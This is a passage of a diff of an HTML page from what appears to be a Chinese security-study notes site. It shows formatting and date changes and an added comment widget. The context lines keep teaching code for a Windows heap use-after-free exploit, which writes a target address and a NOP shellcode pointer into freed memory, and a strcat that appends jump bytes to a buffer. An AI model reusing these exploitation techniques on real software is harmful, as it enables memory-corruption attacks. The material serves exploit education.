 <a href="#__codelineno-13-36" id="__codelineno-13-36" name="__codelineno-13-36"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="s">"</span><span class="se">\xFF\xD1\x90\x90</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
@@ -1308,22 +1316,22 @@
 <li>
 <p>写入已释放内存</p>
 <div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1"></a><a href="#__codelineno-15-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_unalloc</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<a id="__codelineno-15-2" name="__codelineno-15-2"></a><a href="#__codelineno-15-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">fp</span><span class="p">;</span><span class="w"></span>
-<a id="__codelineno-15-3" name="__codelineno-15-3"></a><a href="#__codelineno-15-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">bp</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-2" name="__codelineno-15-2"></a><a href="#__codelineno-15-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">fp</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-3" name="__codelineno-15-3"></a><a href="#__codelineno-15-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">bp</span><span class="p">;</span><span class="w"></span>
 <a id="__codelineno-15-4" name="__codelineno-15-4"></a><a href="#__codelineno-15-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="p">}</span><span class="w"> </span><span class="n">unalloc</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">Punalloc</span><span class="p">;</span><span class="w"></span>
 <a id="__codelineno-15-5" name="__codelineno-15-5"></a><a href="#__codelineno-15-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="kt">char</span><span class="w"> </span><span class="n">shellcode</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"</span><span class="se">\x90\x90\x90\xb0\x06\x90\x90</span><span class="s">"</span><span class="p">;</span><span class="w"></span>
 <a id="__codelineno-15-6" name="__codelineno-15-6"></a><a href="#__codelineno-15-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="kt">int</span><span class="w"> </span><span class="nf">_tmain</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="n">_TCHAR</span><span class="o">*</span><span class="w"> </span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<a id="__codelineno-15-7" name="__codelineno-15-7"></a><a href="#__codelineno-15-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">    </span><span class="n">Punalloc</span><span class="w"> </span><span class="n">h1</span><span class="p">;</span><span class="w"></span>
-<a id="__codelineno-15-8" name="__codelineno-15-8"></a><a href="#__codelineno-15-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">    </span><span class="n">HLOCAL</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<a id="__codelineno-15-9" name="__codelineno-15-9"></a><a href="#__codelineno-15-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hp</span><span class="p">;</span><span class="w"></span>
-<a id="__codelineno-15-10" name="__codelineno-15-10"></a><a href="#__codelineno-15-10"><span class="linenos" data-linenos="10 "></span></a><span class="w">    </span><span class="n">hp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">);</span><span class="w"></span>
-<a id="__codelineno-15-11" name="__codelineno-15-11"></a><a href="#__codelineno-15-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">    </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Punalloc</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w">     </span><span class="c1">//(1)</span>
-<a id="__codelineno-15-12" name="__codelineno-15-12"></a><span class="hll"><a href="#__codelineno-15-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h1</span><span class="p">);</span><span class="w">                                    </span><span class="c1">//(2)</span>
-</span><a id="__codelineno-15-13" name="__codelineno-15-13"></a><span class="hll"><a href="#__codelineno-15-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">    </span><span class="n">h1</span><span class="o">-&gt;</span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="mh">0x042B17C</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span><span class="w">                        </span><span class="c1">//(3)</span>
-</span><a id="__codelineno-15-14" name="__codelineno-15-14"></a><span class="hll"><a href="#__codelineno-15-14"><span class="linenos" data-linenos="14 "></span></a><span class="w">    </span><span class="n">h1</span><span class="o">-&gt;</span><span class="n">bp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcode</span><span class="p">;</span><span class="w"></span>
-</span><a id="__codelineno-15-15" name="__codelineno-15-15"></a><a href="#__codelineno-15-15"><span class="linenos" data-linenos="15 "></span></a><span class="w">    </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w">               </span><span class="c1">//(4)</span>
-<a id="__codelineno-15-16" name="__codelineno-15-16"></a><a href="#__codelineno-15-16"><span class="linenos" data-linenos="16 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">);</span><span class="w">                                    </span><span class="c1">//(5)</span>
-<a id="__codelineno-15-17" name="__codelineno-15-17"></a><a href="#__codelineno-15-17"><span class="linenos" data-linenos="17 "></span></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-7" name="__codelineno-15-7"></a><a href="#__codelineno-15-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">    </span><span class="n">Punalloc</span><span class="w"> </span><span class="n">h1</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-8" name="__codelineno-15-8"></a><a href="#__codelineno-15-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">    </span><span class="n">HLOCAL</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-9" name="__codelineno-15-9"></a><a href="#__codelineno-15-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hp</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-10" name="__codelineno-15-10"></a><a href="#__codelineno-15-10"><span class="linenos" data-linenos="10 "></span></a><span class="w">    </span><span class="n">hp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-15-11" name="__codelineno-15-11"></a><a href="#__codelineno-15-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">    </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Punalloc</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w">     </span><span class="c1">//(1)</span>
+<a id="__codelineno-15-12" name="__codelineno-15-12"></a><span class="hll"><a href="#__codelineno-15-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h1</span><span class="p">);</span><span class="w">                                    </span><span class="c1">//(2)</span>
+</span><a id="__codelineno-15-13" name="__codelineno-15-13"></a><span class="hll"><a href="#__codelineno-15-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">    </span><span class="n">h1</span><span class="o">-&gt;</span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="mh">0x042B17C</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span><span class="w">                        </span><span class="c1">//(3)</span>
+</span><a id="__codelineno-15-14" name="__codelineno-15-14"></a><span class="hll"><a href="#__codelineno-15-14"><span class="linenos" data-linenos="14 "></span></a><span class="w">    </span><span class="n">h1</span><span class="o">-&gt;</span><span class="n">bp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcode</span><span class="p">;</span><span class="w"></span>
+</span><a id="__codelineno-15-15" name="__codelineno-15-15"></a><a href="#__codelineno-15-15"><span class="linenos" data-linenos="15 "></span></a><span class="w">    </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w">               </span><span class="c1">//(4)</span>
+<a id="__codelineno-15-16" name="__codelineno-15-16"></a><a href="#__codelineno-15-16"><span class="linenos" data-linenos="16 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">);</span><span class="w">                                    </span><span class="c1">//(5)</span>
+<a id="__codelineno-15-17" name="__codelineno-15-17"></a><a href="#__codelineno-15-17"><span class="linenos" data-linenos="17 "></span></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
 <a id="__codelineno-15-18" name="__codelineno-15-18"></a><a href="#__codelineno-15-18"><span class="linenos" data-linenos="18 "></span></a><span class="p">}</span><span class="w"></span>
 </code></pre></div>
 <ol>
@@ -1449,12 +1457,45 @@
 <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2022年4月7日 19:02:45</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2022年10月3日 12:00:17</span>
 <br/>
         创建日期:
         <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2021年11月4日 16:44:46</span>
 </small>
 </div>
+<h2 id="__comments">评论</h2>
+<!-- Insert generated code here -->
+<script async="" crossorigin="anonymous" data-category="Announcements" data-category-id="DIC_kwDOGXfwBs4CQ0RQ" data-emit-metadata="0" data-input-position="top" data-lang="zh-CN" data-loading="lazy" data-mapping="pathname" data-reactions-enabled="1" data-repo="jasonren0403/notes" data-repo-id="R_kgDOGXfwBg" data-strict="0" data-theme="preferred_color_scheme" src="https://giscus.app/client.js">
+</script>
+<!-- Synchronize Giscus theme with palette -->
+<script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    /* Set palette on initial load */
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+        var theme = palette.color.scheme === "slate" ? "dark" : "light"
+        giscus.setAttribute("data-theme", theme)
+    }
+
+    /* Register event handlers after documented loaded */
+    document.addEventListener("DOMContentLoaded", function() {
+        var ref = document.querySelector("[data-md-component=palette]")
+        ref.addEventListener("change", function() {
+            var palette = __md_get("__palette")
+            if (palette && typeof palette.color === "object") {
+                var theme = palette.color.scheme === "slate" ? "dark" : "light"
+
+                /* Instruct Giscus to change theme */
+                var frame = document.querySelector(".giscus-frame")
+                frame.contentWindow.postMessage(
+                    { giscus: { setConfig: { theme } } },
+                    "https://giscus.app"
+                )
+            }
+        })
+    })
+</script>
 </article>
 </div>
 </div>
@@ -1561,5 +1602,5 @@
 <script src="https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js"></script>
 <script src="../assets/javascripts/doc_addins.js"></script>
 <script src="../assets/javascripts/share.js"></script>
-<script>document$.subscribe(() => {const lightbox = GLightbox({"touchNavigation": true, "loop": false, "width": "100%", "height": "auto", "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom"});})</script></body>
+<script>document$.subscribe(() => {const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom"});})</script></body>
 </html>
